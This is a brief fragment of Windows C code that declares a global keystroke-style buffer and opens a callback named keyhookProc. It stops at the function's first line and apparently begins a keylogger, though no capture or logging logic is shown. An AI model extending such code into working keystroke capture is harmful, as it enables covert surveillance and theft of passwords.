#include <Windows.h>
#include <stdio.h>

#define BUFFER_SIZE 1024
char buffer[BUFFER_SIZE];
size_t bufferPos = 0;

void CALLBACK keyhookProc(int uID, int nCode, DWORD dwState, DWORD dwExtraInfo) {
